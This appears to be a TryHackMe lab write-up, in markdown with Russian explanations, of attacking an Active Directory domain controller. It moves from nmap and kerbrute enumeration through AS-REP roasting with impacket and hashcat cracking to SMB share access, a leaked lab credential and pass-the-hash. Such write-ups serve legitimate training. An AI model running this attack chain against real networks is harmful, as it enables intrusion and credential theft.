> [!NOTE]
> 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?
>IP: 10.10.154.119 

# Recon

```
sudo nmap -p- -sC -sV -T5 -Pn 10.10.154.119 --vv
```

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-04 15:16:18Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-04T15:17:13+00:00
|_ssl-date: 2025-05-04T15:17:22+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-05-03T15:01:07
| Not valid after:  2025-11-02T15:01:07
| MD5:   51bb:bad3:235b:a6a5:168e:5751:9093:fdd1
| SHA-1: b7cc:0760:1e4d:e364:6b50:7ffc:c041:3927:923e:d2f6
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQbxQFYnhU+YtEzM9ZIJTNLjANBgkqhkiG9w0BAQsFADAu
| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe
| Fw0yNTA1MDMxNTAxMDdaFw0yNTExMDIxNTAxMDdaMC4xLDAqBgNVBAMTI0F0dGFj
| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEA9eaGvHdc1tzfjLn2BqSjiF/YVPoOkrtsVx3pJtE25Rqp
| n5Dn3k/pmSasHJP1INHYgAWNetMl67PauV8kvbBjBpwsUH0ErGHsJmCW0C1VTdFt
| oCRW0ow+2Jhc1oPx0Jb6L2xMj776T68KzvlRIWyFeJr5/nlb4hHc3853stL4Lfsn
| oP+PjpvqTr1ieJsyz7PtfVG5ODvA/fdO2QA6BtyYtUPF3x+sRybukG0VGktPy+dz
| O8Q5p1L5nfnNHIq2bU/W8GPfSPfryUX69aTLHs7IvlZgM8Pw+kF34kYrt9SlPkvT
| X7uHxHQ/26ysqfUjw9tFsS90Btj2g9v1Wuc1sGzM5QIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAI7m
| pNzmOwyPDA4gpbHi4vxQcQsaOcgCY2iZzym4USnXpnuHDKLzkO83P0qJbqnTeSx/
| 2c6lSob9sCIT3tXx1SPlAn6+a0lFoQjlkFhlRKjAioQUSRWO+WL9qv0vy4UrZuds
| BoXIFaqyWjpf8wDcO2/S4MQjX50YWmVIrxXLejHHTd43R5cVRe9Q8o/yhTsQG52i
| 7qDh2yEY1MziskK3k/VcEj91oYtjQ506JuSZ+1a3hNhhxYN+dkJr633uQ8e7UbaJ
| +XVqod4NbpD1RS/nPQ8E2/clpxRi7FNODV9FdZ/qVWQmXUPMp6LmEBz6lPlu8xIJ
| ecV+9DtFB2V8p0abWmA=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
echo "10.10.142.248    spookysec.local" >> /etc/hosts 
```
## SMB
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504182533.png)
```
Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
```

```
enum4linux 10.10.154.119
```
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504183541.png)
## Kerberos enum users

> [!NOTE]
>  Kerberos — это ключевая служба аутентификации в Active Directory. Открыв этот порт, мы можем использовать инструмент [Kerbrute](https://github.com/ropnop/kerbrute/releases) (автор Ронни Флэтерс [@ropnop](https://twitter.com/ropnop) ) для обнаружения пользователей, паролей и даже паролей методом подбора!

```
wget https://github.com/ropnop/kerbrute.git
sudo apt install golang -y
make all
cd dist 
```
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504185127.png)
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504184156.png)
![[20250504184140.png]]
```
./kerbrute_linux_amd64 userenum -d spookysec.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 
```
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504191009.png)

## Abusing Kerberos
> [!NOTE]
> После завершения перечисления учетных записей пользователей мы можем попытаться злоупотребить функцией в Kerberos с помощью метода атаки, называемого  **ASREPRoasting.** ASReproasting происходит, когда для учетной записи пользователя установлена ​​привилегия «Не требуется предварительная аутентификация». Это означает, что учетной записи  **не** нужно предоставлять действительную идентификацию перед запросом билета Kerberos для указанной учетной записи пользователя.


```
2025/05/04 12:09:56 >  [+] VALID USERNAME:       james@spookysec.local
2025/05/04 12:10:10 >  [+] VALID USERNAME:       James@spookysec.local
2025/05/04 12:10:13 >  [+] VALID USERNAME:       robin@spookysec.local
2025/05/04 12:10:51 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/05/04 12:11:11 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/05/04 12:11:53 >  [+] VALID USERNAME:       backup@spookysec.local
2025/05/04 12:12:13 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/05/04 12:12:13 >  [+] VALID USERNAME:       svc-admin@spookysec.local
```

```
awk '{print $NF}' 1 | cut -d '@' -f1 | sort -u > users.txt
```

### Install impacket
```
https://github.com/fortra/impacket
```

```
python3 -m pipx install impacket
```

```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -usersfile /home/goose/Desktop/users.txt spookysec.local/
```

![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504194147.png)
#### bruteforce kerberos
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504194402.png)

```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

# SMB recon
```
smbclient -L spookysec.local -U spookysec.local
```

```
smbclient \\\\spookysec.local\\backup --user svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3665226 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504201030.png)

# LPE DC

> [!NOTE]
> Теперь, когда у нас есть новые учетные данные пользователя, у нас может быть больше привилегий в системе, чем раньше. Имя пользователя учетной записи "backup" заставляет нас задуматься. Для чего эта учетная запись резервного копирования?
> 
> Ну, это резервная учетная запись для контроллера домена. Эта учетная запись имеет уникальное разрешение, которое позволяет синхронизировать все изменения Active Directory с этой учетной записью пользователя. Это включает хэши паролей

backup@spookysec.local:backup2517860
### **Членство в группе "Backup Operators"**

> [!NOTE]
> По умолчанию входит в группу **"Backup Operators"**, которая имеет права:
> - Чтение любых файлов на контроллере домена (даже без явных разрешений)
> - Запуск системных инструментов резервного копирования (ntbackup, wbadmin, VSS)
> - Доступ к веткам реестра **HKLM** (включая SAM)

![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504205848.png)

# Flag1 
User svc-admin
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504204059.png)
# Flag2
user backup
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504204418.png)
# Pass the hash and flag3
![Attacktivedirectory](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/AttacktiveDirectory/screenshots/20250504210037.png)
